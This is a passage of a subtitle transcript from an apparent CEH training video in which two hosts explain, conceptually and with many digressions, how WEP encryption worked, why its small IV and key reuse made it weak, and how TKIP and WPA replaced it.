--> 00:04:15.830\nIn a sense, yes, it is, it represents\nthe idea of wireless encryption,\n\n90\n00:04:15.830 --> 00:04:18.410\nright, Wired Equivalent Privacy.\n\n91\n00:04:18.410 --> 00:04:21.640\nBut the problem is that people\nmistake the fact that with WEP,\n\n92\n00:04:21.640 --> 00:04:23.887\nthey think WEP was the algorithm\nwe implemented, and\n\n93\n00:04:23.887 --> 00:04:26.390\nWEP was the problem and\nyou often hear people say that.\n\n94\n00:04:26.390 --> 00:04:30.050\nRC4 was the algorithm we implemented\nto do the encryption for WEP.\n\n95\n00:04:30.050 --> 00:04:33.570\nAnd the implementation of\nRC4 was done incorrectly.\n\n96\n00:04:33.570 --> 00:04:36.740\nThe wrong size for\nthe key space was chosen,\n\n97\n00:04:36.740 --> 00:04:40.150\nand It was a smaller key\nspace than we thought, or\n\n98\n00:04:40.150 --> 00:04:42.240\nrather we thought at the time that\nit should be, and it was fine.\n\n99\n00:04:42.240 --> 00:04:45.410\nBut we realized very quickly, based on the\namount of traffic on wireless networks,\n\n100\n00:04:45.410 --> 00:04:51.025\nthat within several hours, maybe around\nfive hours on average on a normal network,\n\n101\n00:04:51.025 --> 00:04:52.705\ncertainly very,\nvery small amount of time and\n\n102\n00:04:52.705 --> 00:04:55.705\nvery heavily trafficked networks,\nthat key space will be exhausted.\n\n103\n00:04:55.705 --> 00:04:58.975\nKeys would start repeating, and as\na result of that we would have a problem.\n\n104\n00:04:58.975 --> 00:05:02.997\nAnd so this was really the dual challenge,\nthe small IV, and\n\n105\n00:05:02.997 --> 00:05:06.287\nthe small keyspace that really\nled to the downfall of WEP.\n\n106\n00:05:06.287 --> 00:05:09.387\nBut RC4 was the underlying algorithm,\npeople don't often know that.\n\n107\n00:05:09.387 --> 00:05:11.267\nSo if you're playing geek trivia tonight,\n\n108\n00:05:11.267 --> 00:05:11.917\nall right-\n&gt;&gt; [LAUGH]\n\n109\n00:05:11.917 --> 00:05:12.807\n&gt;&gt; And this comes up,\n\n110\n00:05:12.807 --> 00:05:15.095\nyou are now gonna be able\nto advance to level two.\n\n111\n00:05:15.095 --> 00:05:16.437\n&gt;&gt; That's right.\n&gt;&gt; That's gonna be awesome.\n\n112\n00:05:16.437 --> 00:05:18.347\n&gt;&gt; And RC4 itself was not a bad algorithm,\nif implemented correctly.\n\n113\n00:05:18.347 --> 00:05:22.269\n&gt;&gt; No, and it's still used for years after\nWEP came out, and to this day, is in use.\n\n114\n00:05:22.269 --> 00:05:25.760\nAlthough it's recently been tagged as\nan algorithm you should not use for\n\n115\n00:05:25.760 --> 00:05:29.306\nconfidential and secret information,\ncuz it has been proven that it can be\n\n116\n00:05:29.306 --> 00:05:32.738\ncompromised today, based on modern\ncomputing power, and the advent,\n\n117\n00:05:32.738 --> 00:05:35.440\nand the continued propagation\nof Moore's law, right,\n\n118\n00:05:35.440 --> 00:05:37.265\nwith the doubling of computer power.\n\n119\n00:05:37.265 --> 00:05:39.813\nAnd so, recently,\nRC4 has been perfectly acceptable, and\n\n120\n00:05:39.813 --> 00:05:41.830\ncontinues to be widely used and deployed.\n\n121\n00:05:41.830 --> 00:05:44.860\nSo it's not that RC4 itself was\nthe problem, it was the choice of how we\n\n122\n00:05:44.860 --> 00:05:48.090\nimplement that RC4 that actually\nled to the issues with WEP.\n\n123\n00:05:48.090 --> 00:05:51.230\nBut we wanna go back and actually walk\nthrough the thought process and the steps,\n\n124\n00:05:51.230 --> 00:05:51.920\nso let's take a look.\n\n125\n00:05:51.920 --> 00:05:56.500\nSo WEP itself, right, an encryption\nalgorithm, variety of 802.11E, it's\n\n126\n00:05:56.500 --> 00:06:00.640\nactually the encryption process, but close\nenough for wireless networks, old and\n\n127\n00:06:00.640 --> 00:06:03.970\noriginal wireless security standard,\nby today's standards, easily cracked.\n\n128\n00:06:03.970 --> 00:06:05.440\nSo just some background there.\n\n129\n00:06:05.440 --> 00:06:08.260\nBut what are the steps involved with WEP?\n\n130\n00:06:08.260 --> 00:06:10.370\nHow do we actually walk through,\nwhat did WEP look like?\n\n131\n00:06:10.370 --> 00:06:10.890\nHow did it work?\n\n132\n00:06:10.890 --> 00:06:11.670\nSo let's take a look.\n\n133\n00:06:11.670 --> 00:06:15.973\nWe've got the steps up on the document\nthere as we walk through them, and\n\n134\n00:06:15.973 --> 00:06:18.990\nwanna just kinda talk through them and\nmake sure we are comfortable with them.\n\n135\n00:06:18.990 --> 00:06:19.910\nGot a total of four steps.\n\n136\n00:06:19.910 --> 00:06:21.550\nYou're only seeing\nthe first two by the way.\n\n137\n00:06:21.550 --> 00:06:24.318\nMike has them, he's hiding them from us,\nthis is ransom [CROSSTALK].\n\n138\n00:06:24.318 --> 00:06:26.450\n[LAUGH]\n&gt;&gt; He's gonna charge us to expose them as\n\n139\n00:06:26.450 --> 00:06:29.920\nwe go, and depending on our correct\nanswers, we may or may not see them.\n\n140\n00:06:29.920 --> 00:06:30.890\n&gt;&gt; We may or may not go forward.\n\n141\n00:06:30.890 --> 00:06:32.110\n&gt;&gt; All right, so we'll see here.\n\n142\n00:06:32.110 --> 00:06:34.362\nWe're gonna at least knock off\nthe first two, we'll see how we do.\n\n143\n00:06:34.362 --> 00:06:38.901\nSo step 1, the CRC-32 checksum,\nso CRC cyclic redundancy check,\n\n144\n00:06:38.901 --> 00:06:42.500\nthis is an error control and\ncorrection mechanism.\n\n145\n00:06:42.500 --> 00:06:44.340\nThis is a hash, essentially.\n\n146\n00:06:44.340 --> 00:06:48.028\nWhen we talk about checksums,\nwe talk about a hashing integrity value.\n\n147\n00:06:48.028 --> 00:06:52.810\nSo a CRC-32 checksum is used to calculate\na 32-bit integrity Check Value,\n\n148\n00:06:52.810 --> 00:06:55.750\nit's called the ICV,\nspecifically for the data,\n\n149\n00:06:55.750 --> 00:06:57.540\nwhich in turn is then\nadded to the data frame.\n\n150\n00:06:57.540 --> 00:07:01.090\nWhen we think about the data frame what we\nthink about, and you did a great job of\n\n151\n00:07:01.090 --> 00:07:04.850\nhelping us to understand some diagram,\nit was the whole idea of the data packet.\n\n152\n00:07:04.850 --> 00:07:08.010\nRight, and we had the header in the front,\nwe data had the data gram or\n\n153\n00:07:08.010 --> 00:07:09.640\nthe data frame in the middle essentially.\n\n154\n00:07:09.640 --> 00:07:10.640\nYou know, the pay load.\n\n155\n00:07:10.640 --> 00:07:13.760\nAnd we have the trailer on the backend,\nor as you called it before,\n\n156\n00:07:13.760 --> 00:07:15.811\nwe modified the header and\nthe footer, right?\n\n157\n00:07:15.811 --> 00:07:17.662\n&gt;&gt; [LAUGH]\n&gt;&gt; That's where we're going through and\n\n158\n00:07:17.662 --> 00:07:18.937\nmarking up the diagram, right?\n\n159\n00:07:18.937 --> 00:07:22.093\nAnd so with that,\nwe're adding this CRC, this ICV,\n\n160\n00:07:22.093 --> 00:07:26.654\nthe integrity Check Value to the data\nframe to specify that it has integrity,\n\n161\n00:07:26.654 --> 00:07:31.245\nthat it's not modified or changed,\nwithout our knowledge and our consent.\n\n162\n00:07:31.245 --> 00:07:33.925\nThat it was integrity is all about.\n\n163\n00:07:33.925 --> 00:07:37.862\nSo step 2, the 24-bit or\na 24-bit arbitrary PIN number.\n\n164\n00:07:37.862 --> 00:07:39.152\nThis is where the IV comes in.\n\n165\n00:07:39.152 --> 00:07:42.782\nThis is what I talked about, one of\nthe weaknesses in WEP appears right here,\n\n166\n00:07:42.782 --> 00:07:44.692\nbecause of this initialization vector.\n\n167\n00:07:44.692 --> 00:07:48.422\nThis randomness that we insert or\ninject into the process.\n\n168\n00:07:48.422 --> 00:07:53.446\nBecause it was only 24-bits, it was so\nsmall that unfortunately, did not provide\n\n169\n00:07:53.446 --> 00:07:58.150\nthe protection we thought it would, and\nled ultimately to the downfall of WEP.\n\n170\n00:07:58.150 --> 00:08:02.654\nSo the 24-bit random, or arbitrary number,\nwe traditionally call that an IV, right?\n\n171\n00:08:02.654 --> 00:08:06.256\nIt's little, just a string,\nIs added to the WEP key.\n\n172\n00:08:06.256 --> 00:08:06.920\nThe WEP key and\n\n173\n00:08:06.920 --> 00:08:10.311\nIV together, when we join them together\nare referred to as the WEP seed.\n\n174\n00:08:10.311 --> 00:08:11.780\nThat's actually what we've called in WEP.\n\n175\n00:08:11.780 --> 00:08:15.037\nSo again, a little more detail than\nyou may normally be familiar with,\n\n176\n00:08:15.037 --> 00:08:16.710\nyou may normally hear or see.\n\n177\n00:08:16.710 --> 00:08:20.945\nThe WEP seed is used in step three,\nas the input to the RC4 algorithm.\n\n178\n00:08:20.945 --> 00:08:24.405\nWe mentioned RC4 is the underlying\nalgorithm that is being used.\n\n179\n00:08:24.405 --> 00:08:27.105\nSo RC4 to generate what's\ncalled a key stream.\n\n180\n00:08:27.105 --> 00:08:30.405\nThe key stream as we talked about\nin the cryptography conversations\n\n181\n00:08:30.405 --> 00:08:33.290\ntowards the end of the CEH\nseries of episodes.\n\n182\n00:08:33.290 --> 00:08:35.530\nYou obviously can go and\ntake a look at those.\n\n183\n00:08:35.530 --> 00:08:37.710\nVery interesting and\ncool stuff to talk about.\n\n184\n00:08:37.710 --> 00:08:40.570\nWe did a lot of really good stuff\nwith our friends, Bob and Alice.\n\n185\n00:08:40.570 --> 00:08:42.882\n&gt;&gt; Yeah, we did.\n&gt;&gt; Had a great conversation about all\n\n186\n00:08:42.882 --> 00:08:43.582\nthat stuff.\n\n187\n00:08:43.582 --> 00:08:45.969\nIt would be great one day if we\njust randomly switched Bob and\n\n188\n00:08:45.969 --> 00:08:46.937\nAlice around, right?\n\n189\n00:08:46.937 --> 00:08:50.049\nAnd just continue to talk as if they were,\nstill Bob and Alice, but\n\n190\n00:08:50.049 --> 00:08:52.116\nAlice becomes Bob, and Bob becomes Alice.\n\n191\n00:08:52.116 --> 00:08:54.990\nAnd as a result, everything is backwards.\n\n192\n00:08:54.990 --> 00:08:57.942\nThat would totally put\nthings on it's ear there but\n\n193\n00:08:57.942 --> 00:09:00.837\nthat's the anti-cryptography conversation.\n\n194\n00:09:00.837 --> 00:09:04.715\nWe'll shoot that as a blooper, and\nput it up somewhere separately.\n\n195\n00:09:04.715 --> 00:09:06.963\nBut all right, so anti-Bob and\nanti-Alice, right?\n\n196\n00:09:06.963 --> 00:09:08.102\n&gt;&gt; That's right.\n\n197\n00:09:08.102 --> 00:09:10.714\n&gt;&gt; You ever watch, total random\naside by the way, you ever watch and\n\n198\n00:09:10.714 --> 00:09:13.600\nwe've talked about this before,\nyou ever watch?\n\n199\n00:09:13.600 --> 00:09:16.050\nI don't know what the heck is it now?\n\n200\n00:09:16.050 --> 00:09:17.670\nI can't think of it.\n\n201\n00:09:17.670 --> 00:09:20.797\nIt's on Adult Swim.\n\n202\n00:09:20.797 --> 00:09:22.079\n&gt;&gt; Let's see Squid Billy's, or?\n\n203\n00:09:22.079 --> 00:09:25.578\n&gt;&gt; No, no, no, not Squid Billy's and\nnot Bob's Burgers, which are great,\n\n204\n00:09:25.578 --> 00:09:26.135\nby the way.\n\n205\n00:09:26.135 --> 00:09:27.341\nNo, Rick and Morty.\n\n206\n00:09:27.341 --> 00:09:29.194\n&gt;&gt; [CROSSTALK]\n&gt;&gt; I told you about Rick and Morty.\n\n207\n00:09:29.194 --> 00:09:31.000\n&gt;&gt; Yeah.\n&gt;&gt; You have to watch Rick and Morty.\n\n208\n00:09:31.000 --> 00:09:33.750\nThis is the, I can't say enough.\n\n209\n00:09:33.750 --> 00:09:35.688\nJust bottom line,\nyou gotta watch Rick and Morty.\n\n210\n00:09:35.688 --> 00:09:36.919\nAwesome, awesome.\n\n211\n00:09:36.919 --> 00:09:40.186\nIf you have not watched Rick and\nMorty, this will change your life.\n\n212\n00:09:40.186 --> 00:09:42.125\nIt will totally transform you.\n\n213\n00:09:42.125 --> 00:09:43.456\nYou should,\nit's up there with Pinky and the Brain.\n\n214\n00:09:43.456 --> 00:09:44.755\n&gt;&gt; I'm gonna binge it tonight.\n\n215\n00:09:44.755 --> 00:09:45.324\n&gt;&gt; You remember Pinky.\n\n216\n00:09:45.324 --> 00:09:46.305\n&gt;&gt; I love Pinky and the Brain.\n&gt;&gt; It's up there with Pinky and\n\n217\n00:09:46.305 --> 00:09:47.034\nthe Brain, it's like that.\n\n218\n00:09:47.034 --> 00:09:47.798\n&gt;&gt; Really.\n\n219\n00:09:47.798 --> 00:09:51.625\n&gt;&gt; But only like sci-fi travelling\nthrough multiple dimensions,\n\n220\n00:09:51.625 --> 00:09:53.782\nwith like your cookie grandfather or\n\n221\n00:09:53.782 --> 00:09:56.400\nuncle, who is like the coolest person\n&gt;&gt; Right.\n\n222\n00:09:56.400 --> 00:09:58.926\n&gt;&gt; But is also like the biggest\nA-hole in the world at the same time.\n\n223\n00:09:58.926 --> 00:10:00.486\n&gt;&gt; [LAUGH]\n&gt;&gt; So just cuz it's great,\n\n224\n00:10:00.486 --> 00:10:01.585\nthis is really cool.\n\n225\n00:10:01.585 --> 00:10:04.269\nSo you gotta watch it,\nit's just total, total chaos.\n\n226\n00:10:04.269 --> 00:10:06.728\nAnyway, so let's go back towards\ntalking about step three.\n\n227\n00:10:06.728 --> 00:10:10.729\nSo, making sure WEP seed, is used as\nwe said here to get the key stream,\n\n228\n00:10:10.729 --> 00:10:12.350\nwe generate the key stream.\n\n229\n00:10:12.350 --> 00:10:17.880\nKey stream is then going to allow us to\nbe able to in step four, proceed, you'll\n\n230\n00:10:17.880 --> 00:10:21.440\nsee there the IV field, the initialization\nvector added to the ciphertext.\n\n231\n00:10:21.440 --> 00:10:24.590\nRemember, ciphertext is the encrypted\nplain text that we have essentially\n\n232\n00:10:24.590 --> 00:10:25.510\nciphered.\n\n233\n00:10:25.510 --> 00:10:28.240\nRun through the cryptosystem,\nto generate a MAC frame,\n\n234\n00:10:28.240 --> 00:10:31.290\nand then that's how we actually\nthen are able to transmit.\n\n235\n00:10:31.290 --> 00:10:33.880\nSo the problem really\nexists to two areas here.\n\n236\n00:10:33.880 --> 00:10:38.190\nWe talked about the use in step two of the\n24-bit arbitrary number known as the IV\n\n237\n00:10:38.190 --> 00:10:39.248\nbeing too small.\n\n238\n00:10:39.248 --> 00:10:44.740\nIn step three, as we inject that, combine\nthe WEP seed with RC4, the implementation\n\n239\n00:10:44.740 --> 00:10:47.330\nof RC4, the key space, the bit size-\n&gt;&gt; Right.\n\n240\n00:10:47.330 --> 00:10:48.160\n&gt;&gt; Was too small.\n\n241\n00:10:48.160 --> 00:10:49.820\nAnd as a result of that,\nit was not strong enough.\n\n242\n00:10:49.820 --> 00:10:52.780\n&gt;&gt; You have mentioned several times,\nrepetition, patterns,\n\n243\n00:10:52.780 --> 00:10:54.700\ncryptography, a no, no.\n\n244\n00:10:54.700 --> 00:10:57.036\n&gt;&gt; All that, no matter what,\nyou never ever.\n\n245\n00:10:57.036 --> 00:11:01.439\nYou have a standing rule of thumb if\nyou have a rule with cryptography is,\n\n246\n00:11:01.439 --> 00:11:02.455\npattern, bad.\n\n247\n00:11:02.455 --> 00:11:03.638\nRandom is good, right?\n\n248\n00:11:03.638 --> 00:11:05.553\nI mean,\nthat's just the general thought process.\n\n249\n00:11:05.553 --> 00:11:09.419\nBecause the more we show you,\nthe more we allow you to see.\n\n250\n00:11:09.419 --> 00:11:12.374\nThe more you can latch onto and say,\nI've seen that before, let me go back and\n\n251\n00:11:12.374 --> 00:11:13.391\ncross-reference that.\n\n252\n00:11:13.391 --> 00:11:16.900\nThe more likely it is you can break the\ncryptographic solution we've put in place.\n\n253\n00:11:16.900 --> 00:11:21.170\nIt's just a natural progression\nbased on the evolution of events.\n\n254\n00:11:21.170 --> 00:11:24.450\nAnd we know, unfortunately, this is\nsomething else people often forget.\n\n255\n00:11:24.450 --> 00:11:27.560\nAgain, we talked about this extensively\nin the cryptography episodes.\n\n256\n00:11:27.560 --> 00:11:29.670\nWe’ll mention if there is a cross link,\nbut\n\n257\n00:11:29.670 --> 00:11:33.750\nkeep in mind that there's no such thing\nas true randomness in any system.\n\n258\n00:11:33.750 --> 00:11:37.890\nSo as a result of this, we talk about\nneeding to randomly generate keys and\n\n259\n00:11:37.890 --> 00:11:40.530\nwe really talk about pseudo\nrandom number generation.\n\n260\n00:11:40.530 --> 00:11:41.970\nNot random number generation.\n\n261\n00:11:41.970 --> 00:11:44.376\nPeople often mislabel this and\ndon't understand this.\n\n262\n00:11:44.376 --> 00:11:46.279\nWith the current cryptosystems we use and\n\n263\n00:11:46.279 --> 00:11:48.407\nthe current ways in which\nwe do cryptography.\n\n264\n00:11:48.407 --> 00:11:51.065\nI'm not talking about\nquantum-based cryptography,\n\n265\n00:11:51.065 --> 00:11:53.742\nthat maybe the next big leap,\nliterally quantum leap.\n\n266\n00:11:53.742 --> 00:11:56.290\nRemember that TV show,\nthat was awesome TV show, too.\n\n267\n00:11:56.290 --> 00:11:58.885\nRight?\nSo, but when you think about quantum\n\n268\n00:11:58.885 --> 00:12:03.790\ncryptography, the use of light as\nopposed to electrical impulses for data,\n\n269\n00:12:03.790 --> 00:12:08.855\nto drive not only cryptography, but\nto drive computers to quantum computing.\n\n270\n00:12:08.855 --> 00:12:10.863\nThat is a whole different thought process,\n\n271\n00:12:10.863 --> 00:12:13.806\nthat will radically change the way\nwe talk about cryptography.\n\n272\n00:12:13.806 --> 00:12:17.664\nAnd some of the things that we've been\ntalking about with regards to randomness\n\n273\n00:12:17.664 --> 00:12:19.344\nand patterns, and those things.\n\n274\n00:12:19.344 --> 00:12:21.770\nThere will be changes in\nthe way we talk about this.\n\n275\n00:12:21.770 --> 00:12:23.770\nBut that's coming in the future,\nwe're not there yet.\n\n276\n00:12:23.770 --> 00:12:25.850\nThat's not appropriate for\nthis conversation.\n\n277\n00:12:25.850 --> 00:12:28.210\nPart of what we're doing\nwith CEH in version nine.\n\n278\n00:12:28.210 --> 00:12:31.800\nSpecifically Neil's episodes and this\nentire thought process around this body of\n\n279\n00:12:31.800 --> 00:12:34.730\nknowledge to help you prepare for\nthat exam.\n\n280\n00:12:34.730 --> 00:12:38.020\nWhat we're talking about here is\nthe idea that because there's really no\n\n281\n00:12:38.020 --> 00:12:41.050\ntrue randomness that we can think about,\nuse,\n\n282\n00:12:41.050 --> 00:12:44.620\nimplement to generate these keys,\nat some point there's a pattern.\n\n283\n00:12:44.620 --> 00:12:46.460\nThe question is how long does it take?\n\n284\n00:12:46.460 --> 00:12:50.390\nAnd our defense with regards to\ncryptography is not randomness.\n\n285\n00:12:50.390 --> 00:12:54.690\nPeople present this stuff and really don't\ntake the time to explain it properly.\n\n286\n00:12:54.690 --> 00:12:57.797\nYou're randomness is not our\ntrue defensive mechanism here,\n\n287\n00:12:57.797 --> 00:13:01.800\nbecause the problem is, there is no\nsuch thing as random, that's truly.\n\n288\n00:13:01.800 --> 00:13:03.715\nSo as a result, there will be a pattern.\n\n289\n00:13:03.715 --> 00:13:08.455\nWhat we have to do to defend is make\nthe potential pool of resources,\n\n290\n00:13:08.455 --> 00:13:09.685\nkeys we can reach in to and\n\n291\n00:13:09.685 --> 00:13:13.445\ngrab, or whatever that solution is we're\ntalking about, typically it's keys.\n\n292\n00:13:13.445 --> 00:13:16.665\nWe have to make that work factor,\nthat measure of time,\n\n293\n00:13:16.665 --> 00:13:19.235\nthat it takes to break down the\ncryptosystem based on guessing the key.\n\n294\n00:13:19.235 --> 00:13:23.085\nSo long, we have to make the work space,\nthe key space rather, excuse me.\n\n295\n00:13:23.085 --> 00:13:30.200\nSo big, so broad, so deep, so\nwide that it is computationally infeasible\n\n296\n00:13:30.200 --> 00:13:34.150\nwhich is the term we use that you will\nguess the key through normal means.\n\n297\n00:13:34.150 --> 00:13:37.227\nMeaning, you don't steal the key,\nyou don't go out and\n\n298\n00:13:37.227 --> 00:13:41.289\nbrute force it out of a system and\nfind it, but rather you're guessing it.\n\n299\n00:13:41.289 --> 00:13:44.091\nWe have to make that process so\nlong, so painful.\n\n300\n00:13:44.091 --> 00:13:47.906\nIt take so much time that it is\nunrealistic that we'll be able to do it in\n\n301\n00:13:47.906 --> 00:13:50.118\nour let's say, lifetime or whatever.\n\n302\n00:13:50.118 --> 00:13:53.367\nThat's our true defense,\nnot randomness of key generation.\n\n303\n00:13:53.367 --> 00:13:58.103\nBecause you just can't truly randomly\ngenerate keys in a sustained way that\n\n304\n00:13:58.103 --> 00:14:00.770\nleads to no patterns being able to emerge.\n\n305\n00:14:00.770 --> 00:14:03.650\nThe only truly random cryptosystem and\nthere is one, and\n\n306\n00:14:03.650 --> 00:14:07.410\nwe talked about this again in\nthe cryptography conversations later on.\n\n307\n00:14:07.410 --> 00:14:11.321\nIn the episodes that are set up for\nthat towards the end of our discussions.\n\n308\n00:14:11.321 --> 00:14:15.615\nThe only truly random system is the one\nthat is, the one-time pad, right?\n\n309\n00:14:15.615 --> 00:14:17.670\nAnd the one that's considered unbreakable.\n\n310\n00:14:17.670 --> 00:14:19.290\nNot because it's truly random.\n\n311\n00:14:19.290 --> 00:14:23.060\nPeople often, again, mistake this and\nexplain this incorrectly.\n\n312\n00:14:23.060 --> 00:14:25.990\nWe often say, it's truly random and\ntherefore, it's unbreakable.\n\n313\n00:14:25.990 --> 00:14:27.396\nIt's not actually truly random.\n\n314\n00:14:27.396 --> 00:14:31.527\nThose keys are generated using some\nsort of device that in theory,\n\n315\n00:14:31.527 --> 00:14:34.719\nwill expose a pattern if\nwe examine it long enough.\n\n316\n00:14:34.719 --> 00:14:37.190\nDefense in that system is\nnot randomness either.\n\n317\n00:14:37.190 --> 00:14:41.590\nThe defense in that system is single use\nand then, this destruction of the key, and\n\n318\n00:14:41.590 --> 00:14:43.580\nas a result of that of\nthose keys never repeat.\n\n319\n00:14:43.580 --> 00:14:46.952\nAnd they're only used one time and\nthe keys are never exposed.\n\n320\n00:14:46.952 --> 00:14:48.420\nThat system is unbreakable.\n\n321\n00:14:48.420 --> 00:14:51.780\nIt's the only truly unbreakable\ncryptosystem we currently possess.\n\n322\n00:14:51.780 --> 00:14:54.710\nVery difficult to implement because\nthe keys have to be synchronized, so\n\n323\n00:14:54.710 --> 00:14:58.360\nboth parties must be given a complete\nset of keys in the prioritized order\n\n324\n00:14:58.360 --> 00:14:59.170\nthey're used in.\n\n325\n00:14:59.170 --> 00:15:02.030\nAnd both parties must strictly adhere\nto the protocol of single use and\n\n326\n00:15:02.030 --> 00:15:03.130\nthen destruction.\n\n327\n00:15:03.130 --> 00:15:05.414\nAnd even in theory, even.\n\n328\n00:15:05.414 --> 00:15:07.337\nIf you're able to compromise a key.\n\n329\n00:15:07.337 --> 00:15:08.435\nYou will get one message and\n\n330\n00:15:08.435 --> 00:15:10.825\nnothing more because the key\nnever repeats and therefore,\n\n331\n00:15:10.825 --> 00:15:14.007\nit cannot be used to propagate an attack\nthrough the rest of the cryptosystem.\n\n332\n00:15:14.007 --> 00:15:16.649\nDecrypting all the other\nmessages encrypted with that key,\n\n333\n00:15:16.649 --> 00:15:19.986\nwhich is the fundamental weakness in\nall the other systems we talked about.\n\n334\n00:15:19.986 --> 00:15:23.209\nCuz once we expose that private key,\nthat key that was used to encrypt\n\n335\n00:15:23.209 --> 00:15:26.502\nall the traffic, can decrypt any\ntraffic that it was used to encrypt.\n\n336\n00:15:26.502 --> 00:15:29.340\nAnd that's basically cryptography\nin a nutshells, boys and girls.\n\n337\n00:15:29.340 --> 00:15:30.440\nThank you very much.\n\n338\n00:15:30.440 --> 00:15:31.190\nWe are done.\n\n339\n00:15:31.190 --> 00:15:31.730\n&gt;&gt; Have a nice day.\n\n340\n00:15:31.730 --> 00:15:33.740\n&gt;&gt; Outta here.\nCome and drop the proverbial mic,\n\n341\n00:15:33.740 --> 00:15:35.125\nwe're done, right?\n\n342\n00:15:35.125 --> 00:15:38.250\nAll right, so I mean, we need a little\navatar view like we just pick up on\n\n343\n00:15:38.250 --> 00:15:41.030\noccasion, and just like throw\ndown when I wanna drop the mic.\n\n344\n00:15:41.030 --> 00:15:42.040\nThat would be so cool.\n\n345\n00:15:42.040 --> 00:15:43.090\n&gt;&gt; Megan, can probably work on that one.\n\n346\n00:15:43.090 --> 00:15:44.850\n&gt;&gt; Megan can probably make that happen for\nus.\n\n347\n00:15:44.850 --> 00:15:48.520\nShe is the wizard,\nthe wizard of all those things.\n\n348\n00:15:48.520 --> 00:15:50.401\nShe is just awesome when\nit comes to that stuff.\n\n349\n00:15:50.401 --> 00:15:51.523\nWhat the hell are we talking about?\n\n350\n00:15:51.523 --> 00:15:53.770\n&gt;&gt; Yeah, that was, we're getting ready\nto move on and we talked about that.\n\n351\n00:15:53.770 --> 00:15:55.067\n&gt;&gt; We're talking about\nwireless encryption.\n\n352\n00:15:55.067 --> 00:15:56.158\nWe're talking about WEP and how WEP works.\n\n353\n00:15:56.158 --> 00:15:57.907\nWe have a whole list of things on\nthat list we wanna go through.\n\n354\n00:15:57.907 --> 00:16:00.090\nI think TKIP is up next,\nif I'm not mistaken, right?\n\n355\n00:16:00.090 --> 00:16:01.830\n&gt;&gt; Mm-hm.\n&gt;&gt; So, we have TKIP, the temporal key.\n\n356\n00:16:02.960 --> 00:16:04.888\nA temporal key integrity protocol.\n\n357\n00:16:04.888 --> 00:16:10.083\nSo TKIP comes around as a security\nprotocol that's a replacement for WEP.\n\n358\n00:16:10.083 --> 00:16:12.019\nAs we talk about there.\n\n359\n00:16:12.019 --> 00:16:15.590\nA kind of WEP V 2, in a sense of,\nokay, WEP's broken, what do we do now?\n\n360\n00:16:15.590 --> 00:16:16.980\nSo what we do now is we use WPA.\n\n361\n00:16:16.980 --> 00:16:19.260\nThat's the next stop, right?\n\n362\n00:16:19.260 --> 00:16:21.886\nOn the kind of the protocol and\nencryption chain.\n\n363\n00:16:21.886 --> 00:16:23.994\nAnd so we step back, we kind of retool.\n\n364\n00:16:23.994 --> 00:16:26.880\nWe say, okay, we need something better,\nclearly WEP's no good.\n\n365\n00:16:26.880 --> 00:16:30.420\nThe brain trust that does this\nstuff comes up with WPA and says,\n\n366\n00:16:30.420 --> 00:16:33.690\nall right we're gonna swap\nout the thought process.\n\n367\n00:16:33.690 --> 00:16:36.310\nWe actually surprisingly still use RC4.\n\n368\n00:16:36.310 --> 00:16:36.830\n&gt;&gt; Yeah.\n&gt;&gt; Right?\n\n369\n00:16:36.830 --> 00:16:43.190\nTKIP utilizes the RC4 stream cipher but\nit encrypts and sets it up as 128 bit key.\n\n370\n00:16:43.190 --> 00:16:45.330\nSo it's sort of stronger than\nwhat was implemented in WEP.\n\n371\n00:16:45.330 --> 00:16:48.620\nSo, that's kind of interesting,\na little trivia there that we actually\n\n372\n00:16:48.620 --> 00:16:50.830\nconsider RC4 to be secure,\nas we said, so we roll it forward.\n\n373\n00:16:50.830 --> 00:16:52.650\n&gt;&gt; If it's true,\nthen RC4 was not the problem.\n\n374\n00:16:52.650 --> 00:16:53.350\n&gt;&gt; Exactly.\n\n375\n00:16:53.350 --> 00:16:55.815\nIt was just the implementation of the bad\nchoice on how we architect, right?\n\n376\n00:16:55.815 --> 00:16:56.980\n&gt;&gt; Mm-hm.\n&gt;&gt; So, that's kind of interesting.\n\n377\n00:16:56.980 --> 00:16:58.450\nSo, we use TKIP.\n\n378\n00:16:58.450 --> 00:17:03.314\n&gt;&gt; And we retool T, essentially retool\nWEP, call it WPA, use TKIP, and\n\n379\n00:17:03.314 --> 00:17:06.043\nuse RC4 as the underlying algorithm.\n\n380\n00:17:06.043 --> 00:17:09.577\n128-bit key,\n64-bit MIC integrity check, right?\n\n381\n00:17:09.577 --> 00:17:12.120\nSo message integrity check.\n\n382\n00:17:12.120 --> 00:17:16.980\nTKIP then, as a result as we point out\nthere, is helpful for us in terms of\n\n383\n00:17:16.980 --> 00:17:20.270\nmitigating the vulnerability by\nincreasing the size of the IV.\n\n384\n00:17:20.270 --> 00:17:25.192\nSo one of the key concerns with WEP, where\nit was a small 24-bit intialization vector\n\n385\n00:17:25.192 --> 00:17:28.430\ngets dealt with with with TKIP,\nso that's good.\n\n386\n00:17:28.430 --> 00:17:31.130\nAnd we do that as you can see also by\n\n387\n00:17:31.130 --> 00:17:34.832\nusing what's called mixing functions where\nwe essentially mix that stuff together.\n\n388\n00:17:34.832 --> 00:17:36.410\nThink of putting it in a blender and\n\n389\n00:17:36.410 --> 00:17:39.980\nrandomize it even more in theory\nto make it harder to understand.\n\n390\n00:17:39.980 --> 00:17:44.660\nSo we have 128 bit temporal key,\nor temporal key function.\n\n391\n00:17:44.660 --> 00:17:45.392\nIt's called a TK.\n\n392\n00:17:45.392 --> 00:17:49.228\nThat is combined with the MAC address, and\nthen with the IV to create a key stream.\n\n393\n00:17:49.228 --> 00:17:52.910\nIt's then used to encrypt data,\nfed into RC4 to do that.\n\n394\n00:17:52.910 --> 00:17:54.930\nSo we're using unique variables, right?\n\n395\n00:17:54.930 --> 00:17:58.450\nBut keep in mind, how hard is it have we\nshown in the sniffing episodes, right?\n\n396\n00:17:58.450 --> 00:18:00.690\nPrior to this conversation,\nhow hard would it be for\n\n397\n00:18:00.690 --> 00:18:02.270\nus to sniff MAC addresses\nto figure them out?\n\n398\n00:18:02.270 --> 00:18:03.930\nWe know it's not hard, right?\n\n399\n00:18:03.930 --> 00:18:06.460\nAnd how hard would it be for\nus to figure out the IV?\n\n400\n00:18:06.460 --> 00:18:07.830\nWe know it may not be hard, right?\n\n401\n00:18:07.830 --> 00:18:09.820\nI mean,\nthey tend to be broadcast in the clear.\n\n402\n00:18:09.820 --> 00:18:12.140\nSo there's issues there still.\n\n403\n00:18:12.140 --> 00:18:15.945\nAnd this leads ultimately to\nthe downfall of TKIP over time.\n\n404\n00:18:15.945 --> 00:18:18.180\nBut TKIP implements a sequence counter.\n\n405\n00:18:18.180 --> 00:18:20.830\nSo we protect against replay attacks,\nso that's 